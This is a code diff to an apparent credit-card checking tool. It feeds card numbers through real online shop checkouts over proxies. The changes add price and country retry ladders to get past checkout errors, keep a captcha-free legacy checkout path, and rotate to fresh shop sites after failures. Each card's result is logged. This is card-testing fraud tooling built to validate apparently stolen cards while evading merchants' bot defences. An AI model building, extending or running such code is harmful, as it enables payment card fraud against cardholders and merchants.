@@ -119,6 +119,12 @@ _REAL_RESULTS = (
 )
 
 
+# price/country retry ladder (ported from main(6).py) — recover the two most
+# common "shop is fine but this attempt needs a different product/country" errors.
+PRICE_LADDER = (0.50, 2.0, 5.0, 10.0)
+COUNTRY_LADDER = ("US", "CA", "GB", "AU")
+
+
 def _load_pool(path: str) -> list:
     try:
         with open(path, encoding="utf-8", errors="ignore") as f:
@@ -202,6 +208,8 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
     proxy_dead = False
 
     start_time = time.monotonic()
+    price_idx = 0
+    country_idx = 0
     for attempt in range(CHECK_MAX_RETRIES + 1):
         if time.monotonic() - start_time > CHECK_TOTAL_BUDGET:
             break
@@ -213,7 +221,10 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
                 pass
 
         try:
-            res = await auto_async_v2.run_checkout_for_card_async(cur_site, cc, proxy_url)
+            res = await auto_async_v2.run_checkout_for_card_async(
+                cur_site, cc, proxy_url,
+                min_price=PRICE_LADDER[price_idx],
+                country_override=COUNTRY_LADDER[country_idx])
         except Exception as e:
             err_msg = _err_text(e).replace("\n", " ")[:150]
             last_err = err_msg
@@ -245,6 +256,18 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
             _log.info("%s|%s|%s|%s", cc, response_str, _fmt_price(res.amount), res.currency or "?")
             return _build_response(res, cc=cc, site=cur_site, proxy=cur_proxy, proxy_dead=proxy_dead)
 
+        # price/country ladder — retry same site with a pricier product / different country
+        if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in (status_code + " " + err_text).upper():
+            if price_idx + 1 < len(PRICE_LADDER):
+                price_idx += 1
+                last_res = res
+                continue
+        if "DELIVERY_NO_DELIVERY_STRATEGY" in (status_code + " " + err_text).upper():
+            if country_idx + 1 < len(COUNTRY_LADDER):
+                country_idx += 1
+                last_res = res
+                continue
+
         # any other step failure -> legacy REST fallback, then direct, then fresh site
         # (1) legacy_checkout (captcha-free REST path)
         try:
@@ -263,19 +286,7 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
             _log.info("%s|%s|%s|%s", cc, (leg.get("code") or "CARD_DECLINED").upper(), "0.00", "USD")
             return _build_response(_leg_res, cc=cc, site=cur_site, proxy=cur_proxy, proxy_dead=False)
 
-        # (2) direct retry (no proxy) when the challenge was proxy-triggered
-        if proxy_url and "CF_MANAGED_CHALLENGE" in err_text:
-            try:
-                res_direct = await auto_async_v2.run_checkout_for_card_async(cur_site, cc, "")
-            except Exception:
-                res_direct = None
-            if res_direct is not None:
-                _dc = (res_direct.status_code or "").strip().upper()
-                if res_direct.status != CheckStatus.ERROR or _dc in _REAL_RESULTS:
-                    _log.info("%s|%s|%s|%s", cc, _dc or _err_text(res_direct.error), _fmt_price(res_direct.amount), res_direct.currency or "?")
-                    return _build_response(res_direct, cc=cc, site=cur_site, proxy=cur_proxy, proxy_dead=False)
-
-        # (3) fresh site
+        # (2) fresh site
         bad_sites.add(cur_site)
         cur_site = _next_site(cur_site, bad_sites)
         last_res = res
